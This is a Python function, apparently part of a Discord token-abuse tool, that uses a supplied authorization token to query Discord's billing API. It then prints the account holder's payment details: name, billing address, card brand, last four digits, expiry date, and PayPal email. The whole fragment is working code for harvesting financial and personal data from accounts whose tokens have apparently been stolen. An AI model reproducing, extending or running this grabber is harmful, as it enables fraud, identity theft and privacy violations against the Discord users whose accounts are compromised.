#Card Grab----------------------------------------------+

def cardGrab(cc_digits):
	sessionName = 'Payments info grab'
	errorLog = open('errorlogs.txt', 'a+')
	print(exitMenu)
	print(cardMenu)
	grab1 = []
	try:
		select = str(input('\nSelect: '))
		if select == '1':
			token = input('\nToken: ')
			headers = {'Authorization': token}
			req = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers)
			if req.status_code in statuses:
				grabreq = req.json()
				for grab in grabreq:
					print(grab)
					grab1 = grab['billing_address']
					print(grab1)
					name = grab1['name']
					address1 = grab1['line_1']
					address2 = grab1['line_2']
					city = grab1['city']
					postalСode = grab1['postal_code']
					state = grab1['state']
					country = grab1['country']
					if grab['type'] == 1:
						cc_brand = grab['brand']
						cc_first = cc_digits.get(cc_brand)
						cc_last = grab['last_4']
						cc_month = str(grab['expires_month'])
						cc_year = str(grab['expires_year'])
						card = (f'''
			Payment Type: Credit card
			Valid: {not grab['invalid']}
			CC Holder Name: {name}
			CC Brand: {cc_brand.title()}
			CC Number: {''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last))}
			CC Date: {('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4]}
			Address 1: {address1}
			Address 2: {address2 if address2 else ''}
			City: {city}
			Postal code: {postalСode}
			State: {state if state else ''}
			Country: {country}
			Default Payment Method: {grab['default']}
						''')
					elif grab['type'] == 2:
						card = (f'''
			Payment Type: PayPal
			Valid: {not grab['invalid']}
			PayPal Name: {name}
			PayPal Email: {grab['email']}
			Address 1: {address1}
			Address 2: {address2 if address2 else ''}
			City: {city}
			Postal code: {postalСode}
			State: {state if state else ''}
			Country: {country}
			Default Payment Method: {grab['default']}
						''')
				print(card)
			else:
				errorLog.write(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n")
		elif select == '2':
			print(menu)
			select = str(input('\nSelect: '))
			if select == '1':
				print(helpCardGrabEN)
			elif select == '2':
				print(helpCardGrabRU)
			else:
				print('\nInvalid option.')
		else:
			print('\nInvalid option.')
	except KeyboardInterrupt:
		print('\nExit...')
	errorLog.close()
	nextCode = input('\nPress key to continue.')
	
